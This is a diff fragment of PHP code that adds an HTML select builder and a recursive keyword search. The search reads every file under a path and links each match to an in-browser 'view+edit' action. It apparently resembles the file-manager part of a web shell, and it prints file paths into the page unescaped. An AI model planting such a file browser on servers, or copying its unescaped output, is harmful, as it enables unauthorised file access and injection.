+								$select .= "<option value=\"$key\" selected>$value</option>\n";
+							} else {
+								$select .= "<option value=\"$key\">$value</option>\n";
+							}
+
+						} elseif (is_array($arg[selected])) {
+							if ($arg[selected][$key]==1) {
+								$select .= "<option value=\"$key\" selected>$value</option>\n";
+							} else {
+								$select .= "<option value=\"$key\">$value</option>\n";
+							}
+						}
+					}
+				}
+			$select .= "</select>\n";
+			return $select;
+		}
+	}
+	
+	function find($path) //查找关键词 
+{ 
+	global $oldkey,$type,$type2,$endline,$beline; 
+	if(is_dir("$path")){ 
+	$tempdir=opendir("$path");
+	while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
+	closedir($tempdir);
+	}else{ 
+	if(filesize("$path")){ 
+	$fp=fopen("$path","r"); 
+	$msg=fread($fp, filesize("$path"));
+	fclose($fp); 
+if(strpos($msg, $oldkey) !== false) {
+	$dir = dirname($path);
+	$file = basename($path);
+if($type=="list"){
+	$mymsg = explode("\n",$msg);
+	$long = count($mymsg);
+	$tmp = explode($oldkey,$msg);
+	$tmp = explode("\n",$tmp[0]);
+	$first = count($tmp);
+	$end = "[".$first."/".$long."]";
+}
+if($type2=="getpath"){
+	$get = explode($oldkey,$msg);
+	$get = strlen($get[0]);
+	if(isset($beline)){
+	$get = $get-$beline;
+	}
+	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
+	$getpath = "title = \"".$getpath."\"";
+}
+echo "<span class=\"redfont\" $getpath>找到:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
+}
+                              } 
+                         }                    
+} 
 ?>
